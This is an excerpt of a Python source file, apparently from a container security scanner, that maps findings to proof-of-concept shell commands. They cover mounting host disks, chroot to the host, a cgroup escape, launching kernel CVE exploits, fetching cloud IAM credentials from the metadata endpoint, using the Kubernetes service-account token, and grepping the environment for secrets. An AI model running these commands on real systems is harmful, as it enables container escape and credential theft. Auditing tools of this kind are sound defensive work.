...
POC_TEMPLATES: dict[str, str] = {
    # ── CAPABILITY ────────────────────────────────────────────────
    "cap_sys_admin_mount": ("mkdir -p /mnt/host && mount /dev/{host_device} /mnt/host"),
    ...
    "hostpath_mount_root": ("# Full host filesystem access\nchroot /host /bin/bash"),
    "cgroupfs_escape": (
        "mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && "
        "mkdir /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release && "
        "host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab) && "
    ...
    "devfs_access": (
        "# Mount host disk from /dev\nmkdir -p /mnt/host && mount /dev/{host_device} /mnt/host && ls /mnt/host"
    ),
    ...
    "proc_fd_symlink_traversal": (
        "# Traverse /proc/self/fd symlinks to access host files\nls -la /proc/self/fd/ && readlink /proc/self/fd/*"
    ),
    "device_mapper_access": ("# Access device-mapper to manipulate block devices\ndmsetup ls && dmsetup info"),
    ...
    "cve_2023_32233": ("# CVE-2023-32233 — nf_tables use-after-free\n/tmp/cve_2023_32233"),
    "cve_2024_1086": ("# CVE-2024-1086 — nf_tables double-free\n/tmp/cve_2024_1086"),
    "cve_2021_31440": (
        "# CVE-2021-31440 — eBPF verifier bypass\nbpftool prog load /tmp/cve_2021_31440.o /sys/fs/bpf/pwn"
    ),
    "cve_2022_23222": ("# CVE-2022-23222 — eBPF type confusion\n/tmp/cve_2022_23222"),
    "cve_2024_21626": (
    ...
    "cve_2025_21756": ("# CVE-2025-21756 — vsock use-after-free\n/tmp/cve_2025_21756"),
    "cve_2025_31133": (
    ...
    "cloud_metadata_ssrf": ("curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    "k8s_node_proxy": (
        "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) && "
        'curl -sk -H "Authorization: Bearer $TOKEN" '
    ...
    "user_ns_kernel_exploit": ("# User namespace + kernel exploit chain\nunshare -Urm -- /tmp/kernel_exploit"),
    "cap_sys_admin_apparmor_unconfined": (
        "# SYS_ADMIN without AppArmor — full kernel feature access\n"
        "mkdir -p /mnt/host && mount /dev/{host_device} /mnt/host"
    ),
    # ── INFO_DISCLOSURE ───────────────────────────────────────────
    "env_secret_leak": ("env | grep -iE '(key|secret|token|password|api|credential|auth)'"),
